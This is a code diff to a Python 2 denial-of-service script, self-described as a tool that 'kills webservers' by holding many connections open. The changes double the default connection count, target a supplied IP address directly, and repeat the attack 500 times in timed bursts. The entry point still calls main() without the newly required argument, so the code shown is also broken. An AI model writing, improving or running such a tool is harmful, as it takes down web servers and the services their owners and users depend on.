@@ -27,7 +27,10 @@ def openConnections(url, threads, sleepTime) :
 
 		print "Started %d threads. Hit ctrl-c to exit" % (threads)
 
-		while True: sleep(1)
+		sleep(35)
+		for worker in pool: worker.stop()
+
+		for worker in pool: worker.join()
 
 	except KeyboardInterrupt, e:
 		print "\nCaught keyboard interrupt. Stopping all threads"
@@ -65,7 +68,7 @@ class Worker (threading.Thread):
 
 		s.close()
 
-def main():
+def main(ipAdd):
 	parser = OptionParser(
 	    version="slowdeath v0.1",
 	    description="Kills webservers by keeping many connections open, avoiding timeouts.",
@@ -76,7 +79,7 @@ def main():
 	    help="Number of connections to keep open (default = 100)",
 	    type="int",
 	    dest="threads",
-	    default=100
+	    default=200
 	)
 	parser.add_option(
 	    '-s','--sleep',
@@ -88,10 +91,12 @@ def main():
 
 	options,args = parser.parse_args()
 
-	if len(args) < 1: parser.error("This utility requires at least 1 argument")
+	#if len(args) < 1: parser.error("This utility requires at least 1 argument")
 
-	url = args[0]
-
-	openConnections(url, options.threads, options.sleepTime)
-
+	#url = args[0]
+	url = 'http://' + ipAdd
+	x=500
+	while(x>0):
+		openConnections(url, options.threads, options.sleepTime)
+		x=x-1
 if __name__ == '__main__': main()
